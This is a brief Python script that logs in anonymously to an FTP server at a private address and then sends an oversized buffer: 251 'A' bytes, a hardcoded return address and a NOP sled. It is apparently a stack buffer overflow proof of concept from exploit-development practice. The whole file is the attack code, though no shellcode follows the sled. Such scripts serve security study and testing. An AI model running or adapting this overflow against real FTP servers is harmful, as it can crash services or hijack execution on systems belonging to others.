import socket, os, sys

buff = "A" * 251 + "\xd0\x0a\xf6\x77" + "\x90" * 16

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(('192.168.1.8', 21))

s.recv(1024)

s.send('USER anonymous\r\n')

s.recv(1024)

s.send('PASS anonymous\r\n')

s.recv(1024)

s.send(buff + '\r\n')

s.send('QUIT\r\n')

s.close()